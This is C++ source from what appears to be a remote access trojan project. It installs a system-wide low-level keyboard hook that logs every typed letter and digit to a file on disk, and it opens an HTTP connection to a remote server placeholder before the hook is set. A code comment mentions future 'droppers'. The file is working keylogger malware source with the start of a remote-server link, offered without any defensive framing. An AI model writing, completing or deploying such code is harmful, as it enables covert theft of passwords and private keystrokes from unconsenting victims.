#include "rat.h"
#include "../helper/log.h"
#include <fstream>

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		if (wParam == WM_KEYDOWN) {
			KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
			DWORD vkCode = kbd->vkCode;

			// Currently only simple chars
			if (vkCode >= 0x30 && vkCode <= 0x5A) {
				std::ofstream log;
				log.open("D:/log.txt", std::ios::app);
				log << (char)vkCode;
				log.close();
			}
		}
	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void RAT::startRealtimeKeylogger() {
	using namespace HTTPInfo;

	// -- Establish HTTP Connection to remote server --
	HINTERNETWrapper hSession(WinHttpOpen(
		FISHERMAN_USER_AGENT.c_str(),
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		NO_FLAGS
	));

	if (!hSession) {
		LOG_MSG("Error %u in WinHttpOpen.\n", GetLastError());
		return;
	}

	HINTERNETWrapper hConnect(WinHttpConnect(
		hSession.get(),
		TEMP_SERVER_NAME.c_str(),
		INTERNET_DEFAULT_HTTP_PORT,
		RESERVED
	));

	if (!hConnect) {
		LOG_MSG("Error %u in WinHttpConnect.\n", GetLastError());
		return;
	}

	HINTERNETWrapper hRequest(WinHttpOpenRequest(
		hConnect.get(),
		Methods::GET.c_str(),
		REQUESTED_RESOURCE.c_str(),
		DEFAULT_HTTP_VERSION,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES, // TODO: may need to change this for droppers
		NO_FLAGS
	));

	if (!hRequest) {
		LOG_MSG("Error %u in WinHttpOpenRequest.\n", GetLastError());
		return;
	}

	BOOL bResult = WinHttpSendRequest(
		hRequest.get(),
		WINHTTP_NO_ADDITIONAL_HEADERS,
		ZERO_LENGTH,
		WINHTTP_NO_REQUEST_DATA,
		ZERO_LENGTH,
		ZERO_LENGTH,
		NO_CONTEXT
	);

	if (!bResult) {
		LOG_MSG("Error %u while getting request results.\n", GetLastError());
		return;
	}

	bResult = WinHttpReceiveResponse(
		hRequest.get(),
		RESERVED
	);

	if (!bResult) {
		LOG_MSG("Error %u while receiving response.\n", GetLastError());
		return;
	}

	DWORD dataSize;
	bResult = WinHttpQueryDataAvailable(
		hRequest.get(),
		&dataSize
	);

	if (!bResult) {
		LOG_MSG("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
		return;
	}

	LOG_MSG("Data available: %u", dataSize);

	// -- Start Keylogging -- 
	using namespace Keylogging;
	std::string message;
	SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, NULL, ALL_THREADS);
}